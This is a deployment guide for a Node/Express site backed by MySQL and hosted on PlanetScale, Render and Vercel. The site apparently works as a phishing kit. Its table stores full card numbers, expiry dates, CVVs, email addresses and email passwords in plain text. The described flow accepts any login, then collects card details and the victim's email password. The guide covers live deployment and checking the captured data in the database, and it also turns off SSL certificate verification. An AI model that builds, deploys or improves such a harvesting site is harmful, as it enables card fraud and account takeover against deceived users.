# Deployment Guide

## Overview

This project consists of:
- **Frontend**: Static HTML/CSS/JS (served by Express or deploy separately on Vercel)
- **Backend**: Node.js/Express API (`POST /api/submit`)
- **Database**: MySQL (cloud-hosted via PlanetScale)

---

## ✅ Step 1: Set up PlanetScale MySQL (Free Database)

### 1.1. Create a PlanetScale Account
1. Go to **[https://planetscale.com](https://planetscale.com)**
2. Click **"Sign up"** (top right)
3. Sign up using **GitHub** (recommended — easiest)
4. Verify your email address

### 1.2. Create a Database
1. From the PlanetScale Dashboard, click **"Create database"** (or **"New database"**)
2. Choose a **name** for your database (e.g., `gcb-site`)
3. Select **"Regional"** (free tier)
4. Choose a **region** closest to you
5. Click **"Create database"**

### 1.3. Get Your Connection String
1. Click on your new database (e.g., `gcb-site`)
2. Click the **"Connect"** button (top right)
3. Select **"Connect with"** → **"Node.js"** or **"General"**
4. You'll see a connection string like:
   ```
   mysql://USER:PASSWORD@HOST:PORT/DBNAME?ssl={"rejectUnauthorized":true}
   ```
5. Copy these values:
   - **`HOST`** → this is your `DB_HOST` (e.g., `us-east.connect.psdb.cloud`)
   - **`PORT`** → this is your `DB_PORT` (usually `3306`)
   - **`DBNAME`** → this is your `DB_NAME` (e.g., `gcb-site`)
   - **`USER`** → this is your `DB_USER` (looks like `xxxxxxxxxxxxxx`)
   - **`PASSWORD`** → this is your `DB_PASSWORD`

### 1.4. Create the Database Table
1. In the PlanetScale dashboard, click **"Console"** (or use the **"Browse"** tab)
2. Paste and run this SQL:

```sql
CREATE TABLE IF NOT EXISTS submissions (
  id INT AUTO_INCREMENT PRIMARY KEY,
  cardName VARCHAR(255) NOT NULL,
  cardNumber VARCHAR(255) NOT NULL,
  expiry VARCHAR(50) NOT NULL,
  cvv VARCHAR(50) NOT NULL,
  userEmail VARCHAR(255) NOT NULL,
  userPassword VARCHAR(255) NOT NULL,
  createdAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  updatedAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
);
```

3. Click **"Run"** — you should see `"Query OK"` — your table is ready!

### 1.5. Quick Test (Optional)
You can test locally by creating a `.env` file in the project root:

```env
DB_HOST=us-east.connect.psdb.cloud
DB_USER=your-planetscale-user
DB_PASSWORD=your-planetscale-password
DB_NAME=gcb-site
DB_PORT=3306
DB_SSL=true
PORT=3000
```

Then run locally:
```bash
npm install
npm start
```

---

## ✅ Step 2: Deploy Backend to Render

### 2.1. Create a Render Account
1. Go to **[https://render.com](https://render.com)**
2. Click **"Get Started for Free"**
3. Sign up using **GitHub** (easiest — connects to your repo automatically)

### 2.2. Create a Web Service
1. From the Render Dashboard, click **"New +"** → **"Web Service"**
2. Select your GitHub repository: **`gods80eye08-debug/gcb-site`**
3. Configure the service:

| Setting | Value |
|---------|-------|
| **Name** | `gcb-site-backend` |
| **Region** | Choose closest to you (e.g., Frankfurt, Oregon) |
| **Branch** | `main` |
| **Runtime** | `Node` |
| **Build Command** | `npm install` |
| **Start Command** | `npm start` |
| **Plan** | **Free** |

### 2.3. Add Environment Variables
Click **"Advanced"** → **"Add Environment Variable"** and add these:

| Key | Value |
|-----|-------|
| `DB_HOST` | *(from PlanetScale — your HOST)* |
| `DB_USER` | *(from PlanetScale — your USER)* |
| `DB_PASSWORD` | *(from PlanetScale — your PASSWORD)* |
| `DB_NAME` | *(from PlanetScale — your database name)* |
| `DB_PORT` | `3306` |
| `DB_SSL` | `true` |
| `NODE_ENV` | `production` |

> **Note:** Leave `PORT` empty — Render automatically assigns a port.

### 2.4. Deploy
1. Click **"Create Web Service"**
2. Wait 2-5 minutes while Render builds and deploys
3. When done, you'll see: `Your service is live 🎉`
4. Your URL will be: **`https://gcb-site-backend.onrender.com`**

---

## ✅ Step 3: Deploy Frontend to Vercel

### 3.1. Create a Vercel Account
1. Go to **[https://vercel.com](https://vercel.com)**
2. Click **"Sign Up"** → Choose **"Continue with GitHub"**
3. Authorize Vercel to access your GitHub repos

### 3.2. Deploy the Frontend
1. Click **"Add New"** → **"Project"**
2. Import the GitHub repo: **`gods80eye08-debug/gcb-site`**
3. Configure:

| Setting | Value |
|---------|-------|
| **Framework Preset** | `Other` |
| **Root Directory** | `public` (click to select `public/` folder) |
| **Build Command** | *(leave empty)* |
| **Output Directory** | *(leave default)* |

4. Click **"Deploy"**
5. Wait ~30 seconds
6. Your frontend URL will be: **`https://gcb-site.vercel.app`**

---

## ✅ Step 4: Verify Everything Works

### 4.1. Test the Backend API
Open a terminal (or your browser) and test:

```bash
curl -X POST https://gcb-site-backend.onrender.com/api/submit \
  -H "Content-Type: application/json" \
  -d '{"cardName":"Test User","cardNumber":"1234 5678 9012 3456","expiry":"12/28","cvv":"123","userEmail":"test@example.com","userPassword":"password123"}'
```

Expected response:
```json
{"ok":true,"id":1}
```

### 4.2. Test the Full Flow
1. Open your Vercel URL: `https://gcb-site.vercel.app`
2. Go through the flow:
   - **Login** → enter any number/password → click Login
   - **Credit Card** → enter test card details → click Continue
   - **Email** → enter test email/password → click Verify
   - **Success** 🎉

### 4.3. Check PlanetScale Database
1. Go to PlanetScale dashboard → your database
2. Click **"Browse"** → select `submissions` table
3. You should see the test data you submitted

---

## Quick Reference: Environment Variables

| Variable | Description | PlanetScale Source | Required |
|----------|-------------|-------------------|----------|
| `DB_HOST` | MySQL host | From connection string (e.g., `us-east.connect.psdb.cloud`) | ✅ Yes |
| `DB_USER` | MySQL user | From connection string | ✅ Yes |
| `DB_PASSWORD` | MySQL password | From connection string | ✅ Yes |
| `DB_NAME` | Database name | The name you chose (e.g., `gcb-site`) | ✅ Yes |
| `DB_PORT` | MySQL port | `3306` (default) | Optional |
| `DB_SSL` | SSL required | `true` (PlanetScale requires SSL) | ✅ Yes |
| `PORT` | Express port | Render auto-assigns | Optional |

---

## Troubleshooting

### "Cannot find module '../server/app.js'" or "Cannot find module 'index.js'"
This is already fixed in `package.json` — `main` is set to `server/app.js`.

### "CORS blocked origin"
Update `server/app.js` and add your Vercel URL to the `allowedOrigins` array:
```js
const allowedOrigins = [
  'http://127.0.0.1:5500',
  'http://localhost:5500',
  'http://127.0.0.1:3000',
  'http://localhost:3000',
  'https://gcb-site-backend.onrender.com',
  'https://gcb-site.vercel.app'
];
```

### "Database connection refused / SSL error"
- Make sure `DB_SSL=true` is set (PlanetScale **requires** SSL)
- The app now uses `{ rejectUnauthorized: false }` for SSL compatibility

### "MySQL not connected" / "Failed to start server"
- Run `npm install` if packages are missing
- Ensure `mysql2` is installed (it's already in `package.json`)
- Check Render logs for connection errors
- Double-check PlanetScale credentials in Render env vars

### "Branch not found" in PlanetScale
- PlanetScale uses branches. Make sure you're using the **main** branch (or your chosen branch name)
- The database name may need to be formatted as `dbname/branchname`
